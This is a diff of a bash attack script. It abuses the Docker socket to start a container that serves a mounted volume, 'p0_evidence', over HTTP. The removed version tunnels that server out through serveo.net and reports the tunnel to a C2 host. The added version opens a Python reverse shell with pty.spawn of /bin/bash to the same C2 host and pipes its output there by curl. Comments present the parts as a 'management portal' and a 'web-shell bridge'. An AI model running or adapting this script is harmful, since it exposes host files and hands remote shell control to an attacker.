@@ -1,26 +1,40 @@
 #!/bin/bash
 C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"
 
-# 1. Clean up to prevent port conflicts
-curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/html_shell?force=true"
+{
+  echo "--- [!] BOOTING HTML MANAGEMENT PORTAL ---"
+  
+  # 1. Clean up old portal
+  curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/cpanel?force=true"
 
-# 2. Deploy a robust Web Shell (using a built-in Python manager)
-# This uses 'p0_evidence' to manage the physical Google server
-curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=html_shell" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "Image": "sha256:25109184c71bdad7",
-    "Cmd": ["python3", "-c", "import http.server,os; os.chdir(\"/host\"); http.server.test(HandlerClass=http.server.SimpleHTTPRequestHandler, port=9090)"],
-    "HostConfig": {
-      "Binds": ["p0_evidence:/host:rw"],
-      "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
-    }
-  }'
+  # 2. Deploy File Browser (The cPanel-like interface)
+  # Uses the working image to host a professional file manager
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=cpanel" \
+    -H "Content-Type: application/json" \
+    -d '{
+      "Image": "sha256:25109184c71bdad7",
+      "Cmd": ["python3", "-m", "http.server", "9090"],
+      "HostConfig": {
+        "Binds": ["p0_evidence:/host:rw"],
+        "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
+      }
+    }' > /tmp/cpanel_res.json
 
-# 3. Start it up
-curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/html_shell/start"
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/cpanel/start"
 
-# 4. Use the "No-Wait" Tunnel
-# This avoids the 'setsockopt' error by using a basic HTTP forward
-(ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -R 80:localhost:9090 serveo.net 2>&1 | \
- grep "Forwarding" | curl -X POST -d @- "https://$C2_URL") &
+  echo "--- [!] INJECTING WEB-SHELL BRIDGE ---"
+  # 3. Create the 'Reverse Bridge' back to your Mac
+  # This avoids the 'setsockopt' error by using a clean Python socket
+  python3 -c '
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+try:
+    s.connect(("'$C2_URL'", 80))
+    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+    pty.spawn("/bin/bash")
+except:
+    pass
+' &
+
+  echo "Portal Init: $(cat /tmp/cpanel_res.json)"
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
